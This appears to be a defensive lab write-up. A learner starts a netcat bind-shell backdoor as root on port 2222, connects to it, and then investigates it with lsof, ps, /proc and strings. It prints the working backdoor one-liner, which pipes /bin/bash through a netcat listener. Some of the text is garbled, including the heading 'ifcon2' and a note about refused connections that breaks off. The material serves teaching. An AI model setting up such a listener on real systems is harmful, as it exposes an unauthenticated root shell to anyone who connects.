# Linux CLI 

In this lab we’ll examine a simple backdoor using the Linux command line.
You’ll use common CLI tools to investigate what the backdoor is doing and how it behaves. We’ll run three Kali terminals:

Terminal 1 — host and run the backdoor.

Terminal 2 — connect to the backdoor (attacker/client).

Terminal 3 — perform analysis and investigation.

## 1 — Start Terminal 1 (host the backdoor)

Open a Kali terminal as Administrator (or click the Kali logo in the taskbar). Then become root:

```bash

sudo su -
```


We want the backdoor running as root, while the connection is made from a different user account. Create a FIFO backpipe:

```bash

mknod backpipe p
```

Start the backdoor (Netcat listener piping to a bash shell):

```bash

/bin/bash backpipe 0<backpipe | nc -l 2222 1>backpipe
```

Explanation: this creates a Netcat listener on port 2222 that sends input from the FIFO into /bin/bash, then writes the shell output back into the FIFO — effectively a remote shell backdoor on port 2222.
<img width="995" height="242" alt="Terminal 1" src="https://github.com/user-attachments/assets/6893936f-d0b9-45cb-abae-70d8c633030c" />


## ifcon2 — Terminal 2 (connect to the backdoor)

Open another Kali terminal (right-click the icon → Open). Find the host IP:

```bash

ifconfig
```


Connect to the backdoor (replace the IP with your host’s IP):

nc (YOUR IP ADDRESS) 2222

Note: In case the Connection is refused.
    1. Verify SSH is actually listening on port 2222:

To confirm the connection, run a few commands from Terminal 2:

If you see output, you’re connected to the remote shell.
<img width="989" height="504" alt="Terminal 2" src="https://github.com/user-attachments/assets/29d03518-9168-43e6-8f27-d27bdda8b3e3" />


## 3 — Terminal 3 (analysis)

Open a third Kali terminal and become root again:

```bash

sudo su -
```


Root access is required because we’ll inspect system-wide network connections and process details.

Inspect open network connections with lsof

Show open Internet connections and port numbers:

```bash
lsof -i -P
```
<img width="982" height="185" alt="Terminal 3" src="https://github.com/user-attachments/assets/2fdc718b-c011-4730-98e3-e3b9059709eb" />



Find the Netcat process and its PID from that output, then list files opened by that PID:

```bash
lsof -p [PID]
```
<img width="989" height="315" alt="Terminal 3a" src="https://github.com/user-attachments/assets/b0d1dc3a-06a1-44ef-b567-da70726f6d8c" />


View running processes with ps

List full process details:

```bash
ps aux
```
<img width="990" height="670" alt="Terminal 3b" src="https://github.com/user-attachments/assets/23584b30-50f6-4893-a52b-a041f8b7532a" />


Locate the Netcat (or bash) PID you want to inspect, then change into its /proc directory (replace [pid]):

```bash
cd /proc/[pid]
ls
```
Note: /proc is a virtual filesystem that exposes runtime process information. Your PID will be different.

<img width="984" height="253" alt="Terminal 3c" src="https://github.com/user-attachments/assets/4945f556-545b-4fb7-9c10-94c0cb3a8a53" />


### Inspect in-memory binary strings

You can extract readable strings from the executable mapped for the process:

```bash
strings ./exe | less
```
<img width="640" height="568" alt="Terminal 3d" src="https://github.com/user-attachments/assets/3a55fcf1-04fb-409e-8460-2a59d7fa0761" />



Scrolling through this output often reveals usage text, referenced libraries, and other useful clues (we’re reading the program’s memory image).

Press Enter to reveal more lines in less.
<img width="982" height="560" alt="Terminal 3e" src="https://github.com/user-attachments/assets/da15f547-9bd8-4b24-a27f-8ea0eb807831" />


### Quick reminders

* Replace IPs and PIDs with values from your environment.

* Use Ctrl+C to stop listeners or sessions when finished.

#### Continuous with Labs? 
- [Next Lab](https://github.com/Danychr1/The-Cyber-Defense-Playbook-Project/blob/main/Topics/Tools/Labs/Windows/Windows%20CLI.md)

#### Want to go back to the previous Lab?
- [Previuos Lab](https://github.com/Danychr1/The-Cyber-Defense-Playbook-Project/blob/main/Topics/Tools/Labs/Wireshark/Wireshark.md)
